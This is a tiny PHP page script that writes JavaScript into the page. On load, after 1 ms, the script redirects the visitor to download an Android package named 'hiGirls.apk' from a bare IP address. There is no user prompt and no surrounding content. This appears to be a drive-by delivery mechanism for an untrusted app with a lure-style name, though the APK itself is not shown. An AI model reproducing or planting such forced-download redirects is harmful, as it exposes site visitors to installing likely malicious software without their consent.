<?php

function setTimeout($url,$t){
		$str="<script>";
		$str.="setTimeout(function gotourl(){window.location.href='$url';}, $t);";
		$str.="</script>";
		echo $str;
	}

	$filename = "http://112.124.39.181/down/hiGirls.apk"; 
	setTimeout($filename,1);


?>
